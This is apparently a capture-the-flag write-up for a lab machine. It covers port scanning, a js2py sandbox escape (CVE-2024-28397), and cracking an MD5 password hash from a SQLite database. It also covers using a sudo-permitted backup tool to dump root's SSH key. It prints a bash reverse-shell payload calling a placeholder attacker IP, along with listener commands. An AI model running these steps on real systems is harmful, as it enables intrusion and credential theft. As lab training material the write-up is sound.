# CodePardTwo Writeup

## 1. Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV --min-rate 1000 10.129.3.110
```

Open ports:

- 22 (SSH)
- 8000 (HTTP)

A web service was running on port 8000.

---

## 2. Initial Access

### Source Code Analysis

The web application allowed downloading the source code via the **"DOWNLOAD APP"** button.

```bash
unzip app.zip
cd app
ls -la
```

Inside `requirements.txt`:

```
js2py==0.74
```

This version is vulnerable to CVE-2024-28397 (js2py sandbox escape), which allows remote code execution by escaping the Python sandbox.

Since the website allowed execution of JavaScript code, this vulnerability was exploitable.

---

### Exploitation

A public PoC was modified to execute a reverse shell.

Reverse shell payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/{ATTACKER_IP}/1234 0>&1
```

Start attacker services:

```bash
python3 -m http.server 8080
nc -lnvp 1234
```

Triggering the exploit through the web interface resulted in a reverse shell.

---

## 3. User Privilege Escalation

Inside the application directory:

```bash
pwd
ls -la
```

A SQLite database file `users.db` was discovered.

```bash
sqlite3 users.db
.tables
select * from user;
```

Discovered:

- Username: marco
- Password hash (MD5)

Crack the hash:

```bash
john --format=raw-md5 hash.txt
```

Recovered password allowed SSH login as `marco`.

User flag obtained.

---

## 4. Root Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

User `marco` can run:

```
/usr/local/bin/npbackup-cli
```

This backup tool can be abused to access restricted directories.

---

### Abusing npbackup-cli

Modify backup configuration to include `/root`, then run:

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf -b -f
```

List backup contents:

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --ls
```

Identify root SSH private key:

```
/root/.ssh/id_rsa
```

Dump the key:

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --dump /root/.ssh/id_rsa
```

Fix permissions and connect:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@{TARGET_IP}
```

Root shell obtained.

Root flag captured.

---

# What We Learned

## 1. Outdated Dependencies Can Lead to RCE

Using a vulnerable version of js2py allowed remote code execution through sandbox escape.

---

## 2. Storing Credentials in Application Directories Is Dangerous

Exposed SQLite databases containing password hashes can lead to lateral movement if weak hashing algorithms (e.g., MD5) are used.

---

## 3. Weak Hashing Algorithms Are Risky

MD5 is fast and easily crackable, making it unsuitable for password storage.

---

## 4. Sudo Misconfigurations Can Lead to Full Compromise

Allowing backup tools to run as root enables attackers to read sensitive directories such as `/root`.

Backup utilities should be strictly restricted.